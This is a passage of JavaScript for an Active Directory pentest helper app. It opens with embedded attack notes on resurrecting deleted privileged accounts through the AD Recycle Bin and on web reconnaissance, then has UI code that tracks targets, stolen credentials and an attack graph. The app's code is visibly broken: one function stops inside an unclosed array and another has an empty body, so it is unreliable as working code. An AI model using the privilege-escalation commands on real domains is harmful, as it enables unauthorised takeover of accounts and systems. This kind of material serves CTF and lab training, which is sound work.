<p>This is the active hot edge as of 2026. Server 2025 RTM ships with stricter ACLs on dMSA OUs, but lab/test environments are routinely vulnerable.</p>` },
      { id: "acl-recycle-bin", title: "AD Recycle Bin — Restoring Privileged Tombstones", html: `
<h2>What it is</h2>
<p>When AD Recycle Bin is enabled, deleted user/computer objects are tombstoned for ~180 days. Anyone with <code>Reanimate-Tombstones</code> or <code>Restore-ADObject</code> rights (often <i>Domain Admins</i> but also delegated for Helpdesk) can resurrect them — keeping the original SID, SPN, group memberships, and ACL grants.</p>
<h2>Why attackers love it</h2>
<p>Restored objects re-enter the directory with their original privileges. A long-deleted "cert_admin" with <code>WriteDacl</code> on the CA is a free pivot. The trick is finding restore rights you didn't know you had.</p>
<h2>Find tombstones</h2>
<pre># Show deleted objects (need RecycleBin GUID + base):
ldapsearch -x -H ldap://DC -D 'U@D' -w P \\
  -b 'CN=Deleted Objects,DC=...' \\
  -s subtree '(objectClass=user)' --extended_dn

# Or via PowerShell:
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *</pre>
<h2>Restore</h2>
<pre>Restore-ADObject -Identity '&lt;objectGUID&gt;'
# Now you may have a freshly-resurrected privileged principal.</pre>
<h2>HTB pattern</h2>
<p>Voleur and TombWatcher both use this. The chain is usually: low-priv cred → enumerate Deleted Objects → restore a tombstoned admin/cert-admin → use its surviving credentials/ACLs.</p>` },
    ]},
    { title: "Recon (Web)", concepts: [
      { id: "web-recon", title: "Web-Target First Steps", html: `
<h2>Canonical order</h2>
<ol>
  <li>Fingerprint: <code>curl -sI</code>, <code>whatweb</code>, browser view-source, 404 body. Identify server / framework / language.</li>
  <li>Read everything visible: HTML comments, <code>/robots.txt</code>, <code>/sitemap.xml</code>, footer version, error pages.</li>
  <li>Content discovery: feroxbuster with stack-matched extensions.</li>
  <li>Vhost discovery when you know a domain: ffuf + <code>-ac</code>.</li>
  <li>Once you have a version, searchsploit / GitHub for a specific CVE PoC.</li>
</ol>
<h2>Wordlists that actually hit</h2>
<ul>
  <li><code>seclists/Discovery/Web-Content/raft-medium-directories.txt</code></li>
  <li><code>seclists/Discovery/Web-Content/raft-medium-files.txt</code></li>
  <li><code>seclists/Discovery/DNS/subdomains-top1million-20000.txt</code></li>
</ul>
<h2>Foothold classes to pattern-match</h2>
<p>Default/weak creds · Known-CVE in CMS · SSTI in templated error pages · LFI in ?file / ?page / ?template · SQLi in search / login · Command injection in any "run this for me" parameter · File upload with broken extension filter · SSRF that reaches an internal admin panel · Deserialization in Java/.NET ViewState / PHP cookies.</p>`},
    ]},
  ]
};

/* ===========================================================================
   UTILITIES
   =========================================================================== */
function uid(){ return Math.random().toString(36).slice(2,10); }
function toast(msg, kind=""){
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.className = "show " + kind;
  clearTimeout(toast._t);
  toast._t = setTimeout(()=>{ el.className = ""; }, 1500);
}
async function copy(text){
  try { await navigator.clipboard.writeText(text); toast("copied"); }
  catch(e){ toast("clipboard blocked","bad"); }
}
function esc(s){ return String(s||"").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])); }

/* ===========================================================================
   MUTATION HELPERS (state setters)
   =========================================================================== */
// Replace literal IP occurrences in nmap text with the {{TARGET_IP}} token.
// We parse first to capture the IP, then sanitise the stored text so the
// nmap zone shows generic output that isn't redundant with the IP field.
function stripIp(nmapText, ip){
  if(!nmapText || !ip) return nmapText;
  // Escape dots in the IP for regex; replace all literal IP occurrences globally.
  const re = new RegExp(ip.replace(/\./g, "\\."), "g");
  return nmapText.replace(re, "{{TARGET_IP}}");
}
function addTarget({name="", ip="", nmap=""}){
  const id = uid();
  const parsed = parseNmap(nmap);
  const ports = parsed.ports;
  const has = p => ports.some(x => x.port === p);
  const role = (has(88) && has(389) && has(445)) ? "dc"
             : (has(445) || has(3389) || has(5985)) ? "member"
             : "unknown";
  const finalIp = ip || parsed.leaks.ip || "";
  const cleanNmap = stripIp(nmap, finalIp);
  const t = {
    id, name: name || parsed.leaks.hostname || ip || ("target-"+id.slice(0,4)),
    ip: finalIp,
    nmap: cleanNmap, ports, status:"recon",
    notes:"", nmapParsedAt: nmap ? Date.now() : 0,
    leaks: parsed.leaks,
    role,
    domain: parsed.leaks.domain || "",
    fqdn: parsed.leaks.fqdn || "",
    signing: "unknown",
  };
  state.targets.push(t);
  state.activeTargetId = id;
  state.activeView = "enum";
  // Auto-populate engagement.domain if not already set
  if(!state.engagement.domain && parsed.leaks.domain) state.engagement.domain = parsed.leaks.domain;
  save(); render();
}
function removeTarget(id){
  if(!confirm("Remove this target and its notes?")) return;
  state.targets = state.targets.filter(t => t.id !== id);
  delete state.ranRules[id];
  // Purge from user authTo / adminOn / access edges
  for(const u of state.users){
    u.authTo = (u.authTo||[]).filter(tid => tid !== id);
    u.adminOn = (u.adminOn||[]).filter(tid => tid !== id);
    u.access  = (u.access||[]).filter(a => a.target !== id);
  }
  // Purge from graph positions + selection
  delete state.graphPositions["host:"+id];
  if(state.graphSelection && state.graphSelection.kind==="host" && state.graphSelection.id===id) state.graphSelection=null;
  if(state.activeTargetId === id) state.activeTargetId = state.targets[0]?.id || null;
  save(); render();
}
function updateTargetField(id, field, val){
  const t = state.targets.find(x => x.id === id); if(!t) return;
  if(field === "nmap"){
    const parsed = parseNmap(val);
    t.ports = parsed.ports;
    t.leaks = parsed.leaks;
    t.nmapParsedAt = Date.now();
    // Authoritative re-derivation from the parse: domain/fqdn/role come from
    // the nmap NSE output. We OVERWRITE so re-pasting a fresh scan corrects
    // any stale value. Name/IP we only fill if blank — those are user-edited.
    if(!t.name && parsed.leaks.hostname) t.name = parsed.leaks.hostname;
    if(!t.ip && parsed.leaks.ip) t.ip = parsed.leaks.ip;
    if(parsed.leaks.domain) t.domain = parsed.leaks.domain;
    if(parsed.leaks.fqdn)   t.fqdn   = parsed.leaks.fqdn;
    const has = p => parsed.ports.some(x => x.port === p);
    if(has(88) && has(389) && has(445)) t.role = "dc";
    else if(has(445) || has(3389) || has(5985)) t.role = (t.role === "dc" ? "dc" : "member");
    // Sanitise stored text — replace literal IP occurrences with {{TARGET_IP}}
    t.nmap = stripIp(val, t.ip);
  } else {
    t[field] = val;
  }
  save(); render();
}
function toggleRan(targetId, ruleId){
  if(!state.ranRules[targetId]) state.ranRules[targetId] = [];
  const arr = state.ranRules[targetId];
  const i = arr.indexOf(ruleId);
  if(i >= 0) arr.splice(i, 1); else arr.push(ruleId);
  save(); render();
}
function addUser(init={}){
  state.users.push({
    id: uid(), name: init.name||"user"+(state.users.length+1),
    domain: init.domain || state.engagement.domain || "",
    password: init.password||"", hashNT: init.hashNT||"", hashLM:"", aes256:"",
    tgtB64:"", isDA:!!init.isDA, isEA:!!init.isEA,
    kerberoastable:!!init.kerberoastable, asreproastable:!!init.asreproastable,
    rbcdWriter:false, readLaps:false,
    authTo:[], adminOn:[], abuses:[], dcsync:false,
    access:[],
  });
  save(); render();
}
function removeUser(id){
  state.users = state.users.filter(u => u.id !== id);
  // Purge user references from other users' abuses edges
  for(const u of state.users){
    u.abuses = (u.abuses||[]).filter(a => a.target !== id);
  }
  delete state.graphPositions["user:"+id];
  delete state.ranRules["user:"+id];
  if(state.graphSelection && state.graphSelection.kind==="user" && state.graphSelection.id===id) state.graphSelection=null;
  if(state.activeTargetId === "user:"+id){
    state.activeTargetId = state.targets[0]?.id || null;
  }
  save(); render();
}

/* ===========================================================================
   RENDER
   =========================================================================== */
// Capture focused-element id + cursor selection so we can restore it after
// re-render. Called by render() and renderView() to keep typed-into inputs
// from losing focus on every keystroke.
function captureFocus(){
  const a = document.activeElement;
  if(!a || !a.id || (a.tagName !== "INPUT" && a.tagName !== "TEXTAREA")) return null;
  return { id: a.id, s: a.selectionStart, e: a.selectionEnd };
}
function restoreFocus(snap){
  if(!snap) return;
  const el = document.getElementById(snap.id);
  if(!el || typeof el.focus !== "function") return;
  el.focus();
  try { el.setSelectionRange(snap.s, snap.e); } catch(_){}
}
function render(){
  const f = captureFocus();
  renderSide();
  renderTop();
  renderView();
  restoreFocus(f);
}
function renderSide(){
  document.querySelectorAll("nav.side .tab").forEach(b => {
    b.classList.toggle("active", b.dataset.view === state.activeView);
  });
}
function renderTop(){
  const el = document.getElementById("top");
  if(state.activeView === "enum"){
    el.innerHTML = `
      <div class="topbar">
        <span class="title">PATHFINDER · ENUM</span>
        <span class="spacer"></span>
      </div>
      ${state.users.length ? `
      <div class="subtabs subtabs-users">
        ${state.users.map(u => {
          const dot = u.isDA ? 'pwned' : ((u.password || u.hashNT || u.aes256 || u.tgtB64) ? 'footed' : 'recon');
          const tip = (u.isDA?'DA ':'') + (u.kerberoastable?'kerberoastable ':'') + (u.asreproastable?'asrep ':'') + (u.hashNT?'hasNT ':'') + (u.password?'hasPW ':'');
          return `<button class="subtab" data-user-tab="${u.id}" title="${esc(tip||'user')}">
            <span class="dot ${dot}"></span>${esc(u.name)}
            <span class="x" data-user-del="${u.id}">×</span>
          </button>`;
        }).join("")}
      </div>` : ''}
      <div class="subtabs">
        ${state.targets.map(t => `
          <button class="subtab ${state.activeTargetId===t.id?'active':''}"
                  data-subtab="${t.id}"
                  title="${esc(t.name)} — ${esc(t.ip)} (${t.status}). ${t.ports.length} port(s).">
            <span class="dot ${t.status}"></span>${esc(t.name)}
            <span class="x" data-subtab-del="${t.id}">×</span>
          </button>`).join("")}
        ${state.targets.length >= 2 ? `
          <button class="subtab net ${state.activeTargetId==='__net__'?'active':''}" data-subtab="__net__"
                  title="Cross-host actions: relay lists, multi-host sprays, coercion.">
            ⇌ network
          </button>` : ''}
      </div>
      <div class="subtabs subtabs-add">
        <button class="subtab add" id="btn-add-stub" title="Create a new empty target.">+ target</button>
        <button class="subtab add" id="btn-add-user-stub" title="Add an AD principal (user). Used to flag kerberoastable / AS-REP / hash-bearing users.">+ user</button>
      </div>`;
    wireEnumTop();
  } else {
    el.innerHTML = `<div class="topbar"><span class="title">PATHFINDER · ${state.activeView.toUpperCase()}</span><span class="spacer"></span></div>`;
  }
  // Left-nav click binding (idempotent — re-wire every render is fine)
  document.querySelectorAll("nav.side .tab").forEach(b => {
    b.onclick = () => { state.activeView = b.dataset.view; save(); render(); };
  });
}
function wireEnumTop(){
  document.getElementById("btn-add-stub")?.addEventListener("click", openAddTarget);
  document.getElementById("btn-add-user-stub")?.addEventListener("click", openAddUser);
  document.querySelectorAll("[data-subtab]").forEach(el => {
    el.onclick = (ev) => {
      if(ev.target.matches("[data-subtab-del]")) return;
      state.activeTargetId = el.dataset.subtab; save(); render();
    };
  });
  document.querySelectorAll("[data-subtab-del]").forEach(el => {
    el.onclick = (ev) => { ev.stopPropagation(); removeTarget(el.dataset.subtabDel); };
  });
  document.querySelectorAll("[data-user-del]").forEach(el => {
    el.onclick = (ev) => { ev.stopPropagation(); removeUser(el.dataset.userDel); };
  });
  // Click the body of a user-tab → switch to that user's enum view
  document.querySelectorAll("[data-user-tab]").forEach(el => {
    el.onclick = (ev) => {
      if(ev.target.matches("[data-user-del]")) return;
      state.activeTargetId = "user:" + el.dataset.userTab;
      save(); render();
    };
  });
}
function renderView(){
  const f = captureFocus();
  const el = document.getElementById("view");
  if(state.activeView === "enum")      el.innerHTML = renderEnum();
  else if(state.activeView === "codex") el.innerHTML = renderCodex();
  else if(state.activeView === "graph") el.innerHTML = renderGraph();
  else if(state.activeView === "settings") el.innerHTML = renderSettings();
  wireView();
  restoreFocus(f);
}
function renderEnum(){
  if(state.targets.length === 0 && state.users.length === 0){
    return `<div class="empty">
      <h2>No targets or users yet</h2>
      <p>Click <b>+ target</b> or <b>+ user</b> below to start.</p>
      <p>Paste nmap output into a target and rules will populate automatically.</p>
    </div>`;
  }
  if(state.activeTargetId === "__net__") return renderNetwork();
  // User-subject view: activeTargetId is "user:<id>"
  if(typeof state.activeTargetId === "string" && state.activeTargetId.startsWith("user:")){
    const u = state.users.find(x => "user:"+x.id === state.activeTargetId);
    if(u) return renderUser(u);
  }
  const t = state.targets.find(x => x.id === state.activeTargetId) || state.targets[0];
  if(t) state.activeTargetId = t.id;
  return t ? renderTarget(t) : `<div class="empty"><h2>Pick a target or user above</h2></div>`;
}

function renderUser(u){
  const e = state.engagement;
  const rules = USER_RULES.filter(r => {
    try { return r.when(u, e); } catch(_) { return false; }
  });
  const ranKey = "user:"+u.id;
  const ran = new Set(state.ranRules[ranKey] || []);
  const f = state.ruleFilter;

  const matches = r => {
    if(f.q){
      const q = f.q.toLowerCase();
      if(![r.title, r.why, r.cmd, r.group||"", r.codex||""].join(" ").toLowerCase().includes(q)) return false;
    }
    if(f.unmetOnly && isRuleMet(r, null, e)) return false;
    if(f.hideRan && ran.has(r.id)) return false;
    if(f.phase === "no"   && ruleNeedsCreds(r)) return false;
    if(f.phase === "with" && !ruleNeedsCreds(r)) return false;
    return true;
  };
  const filteredRules = rules.filter(matches);
  const ranCount = rules.filter(r => ran.has(r.id)).length;

  const cred = u.password ? "PW" : (u.hashNT ? "NT" : (u.aes256 ? "AES" : (u.tgtB64 ? "TGT" : "—")));
  const flagBadges = [
    u.isDA ? '<span class="chip" style="background:#3a1530;color:#ff9fd9">DA</span>' : '',
    u.isEA ? '<span class="chip" style="background:#3a1530;color:#ff9fd9">EA</span>' : '',
    u.kerberoastable ? '<span class="chip svc">kerberoastable</span>' : '',
    u.asreproastable ? '<span class="chip svc">AS-REP</span>' : '',
    u.dcsync ? '<span class="chip svc">DCSync</span>' : '',
    u.readLaps ? '<span class="chip svc">LAPS</span>' : '',
    isLikelyServiceAccount(u) ? '<span class="chip svc">svc-account</span>' : '',

function renderUserRuleList(rules, u, ran){
  const f = state.ruleFilter;
  const unran = rules.filter(r => !ran.has(r.id));
  const done  = rules.filter(r =>  ran.has(r.id));
  const phaseOf = r => ruleNeedsCreds(r) ? 1 : 0;
  unran.sort((a, b) => phaseOf(a) - phaseOf(b));

  let html = "", lastGroup = null, lastPhase = null;
  unran.forEach((r, i) => {
    const ph = phaseOf(r);
    if(lastPhase === 0 && ph === 1 && f.phase === "all"){
      html += `<div class="phase-divider">🔒 WITH CREDENTIALS</div>`;
      lastGroup = null;
    }
    lastPhase = ph;
    if(f.grouped){
      const grp = r.group || null;
      if(grp !== lastGroup){
        if(grp) html += `<div class="rule-group">${esc(grp)}</div>`;
        lastGroup = grp;
      }
    }
    html += renderUserRuleCard(r, u, ran, i+1);
  });
  if(done.length){
    html += `<div class="ran-divider" data-toggle-ran="1">──── ✓ ${done.length} ran — click to show/hide ────</div>`;
    if(!f.hideRan){
      html += done.map((r,i) => renderUserRuleCard(r, u, ran, null)).join("");
    }
  }
  return html || `<div style="color:var(--fg-faint);font-size:12px">No user rules match current filter.</div>`;
}

function renderLeaks(t){
  const keys = Object.keys(t.leaks||{}).filter(k => t.leaks[k]);

}
function isRuleMet(r, t, e){
  if(!r.needs || r.needs.length === 0) return true;
  return r.needs.every(need => {
    if(need === "creds")  return requiresCreds(e);
    if(need === "domain") return requiresDomain(t, e);
    if(need === "hash")   return anyHashAvailable();
    if(need === "tgt")    return !!e.tgtB64;
    if(need === "dc")     return looksLikeDC(t);
    return true;
  });
}
// True if the rule requires creds to actually run.
function ruleNeedsCreds(r){
  return (r.needs || []).includes("creds");
}
function renderRuleList(rules, t, ran){
  const f = state.ruleFilter;
  // Split into un-ran and ran
  const unran = rules.filter(r => !ran.has(r.id));
  const done  = rules.filter(r =>  ran.has(r.id));
  // Sort unran: no-creds first (phase 0), with-creds second (phase 1).
  // Stable sort preserves the original (group-clustered) order within each phase.
  const phaseOf = r => ruleNeedsCreds(r) ? 1 : 0;
  unran.sort((a, b) => phaseOf(a) - phaseOf(b));

  let html = "", lastGroup = null, lastPhase = null;
  unran.forEach((r, i) => {
    const ph = phaseOf(r);
    // Phase transition divider: only when both phases are visible (phase=all)
    if(lastPhase === 0 && ph === 1 && f.phase === "all"){
      html += `<div class="phase-divider">🔒 WITH CREDENTIALS</div>`;
      lastGroup = null; // re-emit the group header for the with-creds phase
    }
    lastPhase = ph;
    // Group header (suppressed when grouping is off)
    if(f.grouped){
      const grp = r.group || null;
      if(grp !== lastGroup){
        if(grp) html += `<div class="rule-group">${esc(grp)}</div>`;
        lastGroup = grp;
      }
    }
    html += renderRuleCard(r, t, ran, i+1);
  });
  if(done.length){
    html += `<div class="ran-divider" data-toggle-ran="1">──── ✓ ${done.length} ran — click to show/hide ────</div>`;
    if(!f.hideRan){
      html += done.map((r,i) => renderRuleCard(r, t, ran, null)).join("");
    }
  }
  return html || `<div style="color:var(--fg-faint);font-size:12px">No rules match current filter.</div>`;
}

/* ===========================================================================
   GRAPH — AD-focused attack graph.
   Node ids:  "host:<targetId>" | "user:<userId>"
   Layout:    drag-to-position, persisted in state.graphPositions.
              Initial layout: hosts in top row, users in bottom row,
              evenly distributed. Respecting any prior drag positions.
   Edges (derived — never stored):
     authTo  : user → host (dashed cyan)
     adminOn : user → host (solid red)
     abuse   : user → user (violet, labeled with ACL type)
     dcsync  : user → DC host (amber dashed)
   =========================================================================== */
const GRAPH_DEFAULTS = {
  width:  900, height: 600,
  hostRow: 140, userRow: 460,
  hostSpacing: 200, userSpacing: 130,
  hostW: 160, hostH: 70,
  userR: 34,
  padX: 80,
  // Service rectangles sit just below each host
  svcRow: 230,
  svcW: 44, svcH: 18, svcGap: 4,
};
function graphLayout(){
  const G = GRAPH_DEFAULTS;
  const hosts = state.targets;
  const users = state.users;
  const autoHostX = i => G.padX + i * G.hostSpacing;
  const autoUserX = i => G.padX + 40 + i * G.userSpacing;
  const hostRowW = hosts.length ? autoHostX(hosts.length-1) + G.hostW : 0;
  const userRowW = users.length ? autoUserX(users.length-1) + G.userR : 0;
  const minW = Math.max(G.width, hostRowW + G.padX, userRowW + G.padX);
  const minH = Math.max(G.height, G.userRow + 120);
  const positions = {};
  // Hosts
  hosts.forEach((h, i) => {
    const key = "host:"+h.id;
    positions[key] = state.graphPositions[key] || { x: autoHostX(i) + G.hostW/2, y: G.hostRow };
  });
  // Service nodes — positioned in a row below their host. Pinned to the host
  // (no independent drag) so dragging the host moves the services with it.
  hosts.forEach((h, i) => {
    const services = getTargetServices(h);
    const hostPos = positions["host:"+h.id];
    const totalW = services.length * G.svcW + (services.length - 1) * G.svcGap;
    const startX = hostPos.x - totalW/2 + G.svcW/2;
    services.forEach((s, j) => {
      const key = `svc:${h.id}:${s.code}`;
      positions[key] = { x: startX + j*(G.svcW + G.svcGap), y: hostPos.y + G.hostH/2 + 30 };
    });
  });
  // Users
  users.forEach((u, i) => {
    const key = "user:"+u.id;
    positions[key] = state.graphPositions[key] || { x: autoUserX(i), y: G.userRow };
  });
  return { positions, width: minW, height: minH };
}
function renderGraph(){
  if(state.targets.length === 0 && state.users.length === 0){
    return `<div class="empty">
      <h2>Attack Graph</h2>
      <p>Add a target + a user to start the graph.</p>
      <p>The graph shows who can authenticate where, who has admin where, and user-to-user ACL abuse paths.</p>
      <p style="margin-top:14px"><button id="g-add-target" class="pill-btn on">+ Target</button>
      <button id="g-add-user"   class="pill-btn on">+ User</button></p>
    </div>`;
  }
  const { positions, width, height } = graphLayout();
  const vb = `0 0 ${width} ${height}`;
  const dom = state.engagement.domain || (state.targets.find(t=>t.domain)||{}).domain || "";
  const sel = state.graphSelection;

  // Build edge list (derived — never stored)
  const edges = [];
  for(const u of state.users){
    for(const tid of (u.authTo||[])){
      edges.push({ from:"user:"+u.id, to:"host:"+tid, kind:"auth" });
    }
    for(const tid of (u.adminOn||[])){
      edges.push({ from:"user:"+u.id, to:"host:"+tid, kind:"admin" });
    }
    for(const ab of (u.abuses||[])){
      edges.push({ from:"user:"+u.id, to:"user:"+ab.target, kind:"abuse", label: ab.type });
    }
    for(const a of (u.access||[])){
      edges.push({ from:"user:"+u.id, to:`svc:${a.target}:${a.service}`, kind:"access" });
    }
    if(u.dcsync){
      const dc = state.targets.find(t => t.role === "dc");
      if(dc) edges.push({ from:"user:"+u.id, to:"host:"+dc.id, kind:"dcsync", label:"DCSync" });
    }
  }
  // Render edges
  const edgeSvg = edges.map(e => {
    const a = positions[e.from], b = positions[e.to];
    if(!a || !b) return "";
    const mx = (a.x + b.x) / 2, my = (a.y + b.y) / 2 - 10;
    const path = `M ${a.x} ${a.y} Q ${mx} ${my} ${b.x} ${b.y}`;
    const label = e.label ? `<text class="edge-label" x="${mx}" y="${my-2}">${esc(e.label)}</text>` : "";
    return `<path class="edge ${e.kind}" d="${path}"/>${label}`;
  }).join("");

  // Set of service-node ids that have at least one user with access — used to
  // brighten/dim the service rectangles.
  const accessedSvcKeys = new Set();
  for(const u of state.users)
    for(const a of (u.access||[]))
      accessedSvcKeys.add(`svc:${a.target}:${a.service}`);

  // Render host nodes
  const G = GRAPH_DEFAULTS;
  const hostSvg = state.targets.map(t => {
    const p = positions["host:"+t.id];
    const cls = ["node","host", t.role==="dc"?"dc":"", t.status||"", sel&&sel.kind==="host"&&sel.id===t.id?"selected":""].filter(Boolean).join(" ");
    const x = p.x - G.hostW/2, y = p.y - G.hostH/2;
    const ipText = t.ip ? esc(t.ip) : "—";
    const roleText = t.role === "dc" ? "◆ DC" : (t.role||"").toUpperCase();
    return `
      <g class="${cls}" data-node="host:${t.id}" transform="translate(${p.x},${p.y})">
        <rect x="${-G.hostW/2}" y="${-G.hostH/2}" width="${G.hostW}" height="${G.hostH}" rx="4"/>
        <text class="name" x="0" y="-12">${esc(t.name)}</text>
        <text class="ip"   x="0" y="5">${ipText}</text>
        <text class="role" x="0" y="22">${roleText}</text>
      </g>`;
  }).join("");

  // Render service rectangles for each host
  const svcSvg = state.targets.map(t => {
    const services = getTargetServices(t);
    return services.map(s => {
      const key = `svc:${t.id}:${s.code}`;
      const p = positions[key];
      if(!p) return "";
      const accessed = accessedSvcKeys.has(key);
      return `
        <g class="node svc ${accessed?'accessed':''}" data-node="${key}" data-svc-code="${s.code}" data-svc-host="${t.id}" transform="translate(${p.x},${p.y})">
          <rect x="${-G.svcW/2}" y="${-G.svcH/2}" width="${G.svcW}" height="${G.svcH}" rx="2"/>
          <text class="lab" x="0" y="0">${esc(s.label)}</text>
        </g>`;
    }).join("");
  }).join("");

  // Render user nodes (with cred row underneath)
  const userSvg = state.users.map(u => {
    const p = positions["user:"+u.id];
    const cls = ["node","user", u.isDA?"da":"", sel&&sel.kind==="user"&&sel.id===u.id?"selected":""].filter(Boolean).join(" ");
    const creds = [];
    if(u.password) creds.push({cls:"pw",  txt:"PW"});
    if(u.hashNT)   creds.push({cls:"nt",  txt:"NT"});
    if(u.aes256)   creds.push({cls:"aes", txt:"AES"});
    if(u.tgtB64)   creds.push({cls:"tgt", txt:"TGT"});
    const credsSvg = creds.length
      ? `<g class="creds-row" transform="translate(0,${G.userR+12})">
          ${creds.map((c, i) => `<text class="${c.cls}" x="${(i-(creds.length-1)/2)*22}" y="0">${c.txt}</text>`).join("")}
         </g>` : "";
    const flags = [u.kerberoastable?"K":"", u.asreproastable?"A":"", u.dcsync?"⚙":""].filter(Boolean).join(" ");
    const flagSvg = flags
      ? `<text x="0" y="${-G.userR-6}" fill="var(--amber)" font="10px var(--mono)" style="font:10px var(--mono);text-anchor:middle" title="K=kerberoastable A=AS-REP ⚙=DCSync">${flags}</text>` : "";
    return `
      <g class="${cls}" data-node="user:${u.id}" transform="translate(${p.x},${p.y})">
        <circle cx="0" cy="0" r="${G.userR}"/>
        <text class="name" x="0" y="0">${esc(u.name)}</text>
        ${flagSvg}
        ${credsSvg}
      </g>`;
  }).join("");

  const panel = sel ? renderGraphPanel(sel) : renderGraphHint();

  return `<div class="graph">
    <div class="graph-canvas" id="g-canvas">
      <div class="graph-toolbar">
        <div class="left">
          <span class="dom" title="Engagement domain (or first target domain).">${dom ? esc(dom) : "no domain set"}</span>
        </div>
        <span class="spacer"></span>
        <div class="right">
          <button id="g-add-target" title="Quick add target">+ target</button>
          <button id="g-add-user"   title="Quick add user">+ user</button>
          <button id="g-reset-layout" title="Discard drag positions and re-flow">↻ layout</button>
        </div>
      </div>
      <svg id="g-svg" viewBox="${vb}" preserveAspectRatio="xMidYMid meet">
        <g id="g-edges">${edgeSvg}</g>
        <g id="g-nodes">${hostSvg}${svcSvg}${userSvg}</g>
      </svg>
      <div class="graph-legend">
        <div><span class="sw access"></span><b>access</b> — user → service (SMB/WinRM/...)</div>
        <div><span class="sw auth"></span><b>authTo</b> — user can auth (host-level)</div>
        <div><span class="sw admin"></span><b>adminOn</b> — local/domain admin</div>
        <div><span class="sw abuse"></span><b>ACL abuse</b> — GenericAll / Write / Reset</div>
        <div><span class="sw dcsync"></span><b>DCSync</b> — replication rights</div>
      </div>
    </div>
    <div class="graph-panel">${panel}</div>
  </div>`;
}

/* ===========================================================================
   GRAPH WIRING — click-to-select, drag-to-position, panel bindings.
   Dragging uses svg.createSVGPoint + inverse CTM so it works independent of
   viewBox scaling.
   =========================================================================== */
function wireGraph(){
  const svg = document.getElementById("g-svg");
  // Toolbar buttons
  document.getElementById("g-add-target")?.addEventListener("click", openAddTarget);
  document.getElementById("g-add-user")?.addEventListener("click", openAddUser);
  document.getElementById("g-reset-layout")?.addEventListener("click", () => {
    state.graphPositions = {}; save(); render();
  });
  if(!svg) return; // empty-graph fallback has no SVG

  // Click empty canvas to deselect
  svg.addEventListener("mousedown", (e) => {
    if(e.target === svg || e.target.tagName === "g" && e.target.id === "g-nodes"){
      state.graphSelection = null; save(); render();
    }
  });

  // Drag + select on nodes
  let drag = null; // { nodeId, startX, startY, el, moved }
  function svgPoint(evt){
    const pt = svg.createSVGPoint(); pt.x = evt.clientX; pt.y = evt.clientY;
    return pt.matrixTransform(svg.getScreenCTM().inverse());
  }
  document.querySelectorAll("[data-node]").forEach(el => {
    el.addEventListener("mousedown", (ev) => {
      ev.preventDefault();
      const nodeId = el.dataset.node;
      const p = svgPoint(ev);
      drag = { nodeId, el, offX: 0, offY: 0, startX: p.x, startY: p.y, moved: false };
      const cur = state.graphPositions[nodeId];
      if(cur){ drag.offX = cur.x - p.x; drag.offY = cur.y - p.y; }
      else {
        // Derive current position from the transform
        const m = /translate\(([-\d.]+),([-\d.]+)\)/.exec(el.getAttribute("transform")||"");
        if(m){ drag.offX = parseFloat(m[1]) - p.x; drag.offY = parseFloat(m[2]) - p.y; }
      }
      el.classList.add("dragging");
    });
  });
  window.addEventListener("mousemove", (ev) => {
    if(!drag) return;
    const p = svgPoint(ev);
    const nx = p.x + drag.offX, ny = p.y + drag.offY;
    if(Math.hypot(p.x - drag.startX, p.y - drag.startY) > 3) drag.moved = true;
    state.graphPositions[drag.nodeId] = { x: nx, y: ny };
    // Move the element without re-rendering the whole graph
    drag.el.setAttribute("transform", `translate(${nx},${ny})`);
    // Update connected edge paths inline
    const edgesG = document.getElementById("g-edges");
    if(edgesG) rebuildEdgesInline();
  });
  window.addEventListener("mouseup", () => {
    if(!drag) return;
    drag.el.classList.remove("dragging");
    if(!drag.moved){
      // Treat as click → select
      const [kind, id] = drag.nodeId.split(":");
      state.graphSelection = { kind, id };
      save(); render();
    } else {
      save();
      // After real drag, re-render to refresh panel/selected outline if selected
      render();
    }
    drag = null;
  });

  // Right-panel field bindings
  wireGraphPanel();
}
/* Re-draw edges without full re-render (called during drag for smoothness) */
function rebuildEdgesInline(){
  const edgesG = document.getElementById("g-edges");
  if(!edgesG) return;
  const { positions } = graphLayout();
  const edges = [];
  for(const u of state.users){
    for(const tid of (u.authTo||[]))  edges.push({ from:"user:"+u.id, to:"host:"+tid, kind:"auth" });
    for(const tid of (u.adminOn||[])) edges.push({ from:"user:"+u.id, to:"host:"+tid, kind:"admin" });
    for(const ab of (u.abuses||[]))   edges.push({ from:"user:"+u.id, to:"user:"+ab.target, kind:"abuse", label: ab.type });
    for(const a of (u.access||[]))    edges.push({ from:"user:"+u.id, to:`svc:${a.target}:${a.service}`, kind:"access" });
    if(u.dcsync){
      const dc = state.targets.find(t => t.role === "dc");
      if(dc) edges.push({ from:"user:"+u.id, to:"host:"+dc.id, kind:"dcsync", label:"DCSync" });
    }
  }
  edgesG.innerHTML = edges.map(e => {
    const a = positions[e.from], b = positions[e.to];
    if(!a || !b) return "";
    const mx = (a.x + b.x) / 2, my = (a.y + b.y) / 2 - 10;
    const path = `M ${a.x} ${a.y} Q ${mx} ${my} ${b.x} ${b.y}`;
    const label = e.label ? `<text class="edge-label" x="${mx}" y="${my-2}">${esc(e.label)}</text>` : "";
    return `<path class="edge ${e.kind}" d="${path}"/>${label}`;
  }).join("");
}

function wireGraphPanel(){
  const sel = state.graphSelection;
  if(!sel) return;
  if(sel.kind === "host"){
    const t = state.targets.find(x => x.id === sel.id); if(!t) return;
    const bindText = (id, field) => document.getElementById(id)?.addEventListener("input", e => { t[field] = e.target.value; save(); /* inline update for role */ if(field==="role"||field==="status") render(); else rebuildEdgesInline(); });
    bindText("gp-name","name");
    bindText("gp-ip","ip");
    bindText("gp-domain","domain");
    bindText("gp-fqdn","fqdn");
    document.getElementById("gp-role")?.addEventListener("change", e => { t.role = e.target.value; save(); render(); });
    document.getElementById("gp-status")?.addEventListener("change", e => { t.status = e.target.value; save(); render(); });
    document.getElementById("gp-signing")?.addEventListener("change", e => { t.signing = e.target.value; save(); });
    document.getElementById("gp-remove")?.addEventListener("click", () => removeTarget(t.id));
    return;
  }
  if(sel.kind === "user"){
    const u = state.users.find(x => x.id === sel.id); if(!u) return;
    const bindText = (id, field) => document.getElementById(id)?.addEventListener("input", e => { u[field] = e.target.value; save(); });
    bindText("gp-uname","name");
    bindText("gp-udomain","domain");
    bindText("gp-pw","password");
    bindText("gp-nt","hashNT");
    bindText("gp-aes","aes256");
    bindText("gp-tgt","tgtB64");
